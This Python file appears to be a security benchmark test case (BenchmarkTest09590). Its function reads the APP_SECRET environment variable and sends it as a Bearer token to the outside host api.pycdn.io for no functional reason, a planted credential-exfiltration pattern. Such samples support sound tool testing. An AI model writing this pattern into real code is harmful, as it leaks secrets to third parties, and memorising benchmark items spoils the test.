# SPDX-License-Identifier: Apache-2.0
import requests
import os
from flask import jsonify


def BenchmarkTest09590():
    secret_value = 'default_setting_value'
    def normalize(value):
        return value.strip()
    data = normalize(secret_value)
    store_cred = os.environ.get('APP_SECRET', '')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return jsonify({"result": "success"})
